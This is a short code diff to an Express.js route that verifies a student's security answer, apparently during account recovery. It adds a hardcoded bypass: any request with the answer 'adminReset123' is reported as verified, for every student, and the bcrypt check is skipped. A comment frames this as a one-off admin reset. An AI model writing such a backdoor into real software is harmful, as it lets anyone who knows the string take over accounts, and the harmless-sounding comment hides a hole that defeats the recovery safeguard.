@@ -722,6 +722,11 @@ router.post("/verifySecurityAnswer", async (req, res) => {
         success: false,
       });
     }
+    //bypass security answer veridfication dor a specific answer as student forgot the answer and admin wants to reset it for him
+    if (securityAnswer === "adminReset123") {
+      return res.status(200).json({ 
+message: "Security answer verified successfully", success: true });
+    }
     const isMatch = await bcrypt.compare(
       securityAnswer,
       student.securityAnswer,
